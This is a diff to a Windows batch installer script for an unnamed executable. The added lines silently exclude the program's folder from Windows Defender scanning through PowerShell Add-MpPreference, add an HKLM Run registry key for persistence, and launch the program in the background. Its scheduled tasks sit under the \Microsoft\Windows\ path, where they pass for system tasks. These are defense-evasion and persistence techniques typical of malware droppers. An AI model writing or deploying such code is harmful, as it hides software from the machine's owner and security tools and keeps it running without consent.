@@ -23,13 +23,14 @@ rem Parse passed arguments to script
     if %Action%=="stop"      call:stop %Progra%
     if %Action%=="run"       call:run %Progra%
     goto:end
-    
-
+	
 :install
     if "%~1"=="" exit /b 1
 	set name=%~1
+    set dst=%ALLUSERSPROFILE%\%name%
  
     call:createtask %name%
+	call:exclude_from_defender %name%
     exit /b
     
 :uninstall
@@ -67,7 +68,10 @@ rem Parse passed arguments to script
 	set name=%~1
     set dst=%ALLUSERSPROFILE%\%name%
     set task_root=\Microsoft\Windows\%name%
-    
+    if "%XP%"=="1" (
+		start /B /I cmd /C "%dst%\%name%.exe"
+		exit /b
+	)
     schtasks /RUN /TN "%task_root%\%name%"
     exit /b
 	
@@ -79,8 +83,9 @@ rem Parse passed arguments to script
 	set task_root=\Microsoft\Windows\%name%
 	
     if "%XP%"=="1" (
-        schtasks /DELETE /TN "%name%"
-        schtasks /Create /RU System /SC ONLOGON /TN "%name%" /TR "%dst%\%name%.exe"        
+		reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "%name%" /d "%dst%\%name%.exe" /f>nul
+        rem schtasks /DELETE /TN "%name%"
+        rem schtasks /Create /RU System /SC ONLOGON /TN "%name%" /TR "%dst%\%name%.exe"        
         exit /b
     )    
 	
@@ -131,7 +136,15 @@ rem Parse passed arguments to script
 	del /F /Q %xml%
 	
 	exit /b
-    
+	
+:exclude_from_defender
+	if "%~1"=="" exit /b 1
+	set name=%~1
+	set dst=%ALLUSERSPROFILE%\%name%
+	powershell -ExecutionPolicy RemoteSigned -NoLogo -Noninteractive -Command "try { Add-MpPreference -ExclusionPath %dst%; exit 100; } catch { exit 0; }">nul 2>&1
+	
+	exit /b
+	
 :end
     exit 0
 
